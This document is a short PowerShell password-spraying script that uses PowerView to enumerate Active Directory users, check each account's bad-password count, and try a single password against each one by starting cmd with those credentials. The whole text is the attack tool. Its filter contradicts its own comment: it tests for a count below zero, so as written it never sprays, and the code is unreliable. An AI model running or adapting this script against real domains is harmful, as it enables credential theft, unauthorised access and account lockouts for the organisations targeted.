# will spray only users that currently have 0 bad password attempts
# dependency - powerview

function Get-BadPasswordCount {
    param(
        $username = "username",
        $domain = "offense.local"
    )
    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
    return $badPwdCount
}

$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
$domain = "x"
$password = "y"

Write-Host $users.Count users supplied; $users | % {
    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
    if ($badPasswordCount -lt 0) {
        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
        Start-Process cmd -Credential ($credentials)
    } else {
        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
    }
}